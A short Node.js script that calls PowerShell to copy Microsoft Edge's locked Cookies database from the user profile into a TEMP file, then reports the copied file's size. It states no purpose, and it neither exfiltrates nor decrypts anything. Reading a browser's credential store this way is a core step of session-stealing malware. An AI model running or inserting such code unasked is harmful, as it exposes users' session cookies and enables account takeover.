const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const src = path.join(
  process.env.LOCALAPPDATA,
  'Microsoft',
  'Edge',
  'User Data',
  'Default',
  'Network',
  'Cookies',
);
const out = path.join(process.env.TEMP, 'edge-cookies-rw.bin');

const ps = `
$src = '${src.replace(/'/g, "''")}'
$out = '${out.replace(/'/g, "''")}'
try {
  $fs = [System.IO.File]::Open($src, 'Open', 'Read', 'ReadWrite')
  $ms = New-Object System.IO.FileStream($out, 'Create', 'Write')
  $fs.CopyTo($ms)
  $ms.Close(); $fs.Close()
  Write-Output ("OK " + (Get-Item $out).Length)
} catch {
  Write-Output ("FAIL " + $_.Exception.Message)
}
`;

const r = spawnSync('powershell.exe', ['-NoProfile', '-Command', ps], { encoding: 'utf8' });
console.log(r.stdout || r.stderr);
console.log('exists', fs.existsSync(out), fs.existsSync(out) ? fs.statSync(out).size : 0);
